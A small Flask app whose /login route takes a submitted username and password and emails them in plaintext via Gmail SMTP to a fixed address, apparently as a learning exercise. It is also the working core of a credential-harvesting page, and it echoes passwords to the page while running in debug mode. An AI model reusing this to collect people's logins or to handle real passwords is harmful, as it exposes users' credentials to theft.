from flask import Flask, render_template, request
import smtplib


app = Flask(__name__)


@app.route("/")
def form():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def receive_data():
    my_email = "YOUR EMAIL"
    my_password = "YOUR PASS"
    username = request.form["username"]
    password = request.form["password"]
    with smtplib.SMTP("smtp.gmail.com") as connection:
        connection.starttls()
        connection.login(my_email, my_password)
        connection.sendmail(
            from_addr=my_email,
            to_addrs=my_email,
            msg=f"Subject: Noice Alert!\n\nYour new username is {username} with a password of {password}"
        )
    return render_template("login.html", username=username, password=password)


if __name__ == "__main__":
    app.run(debug=True)
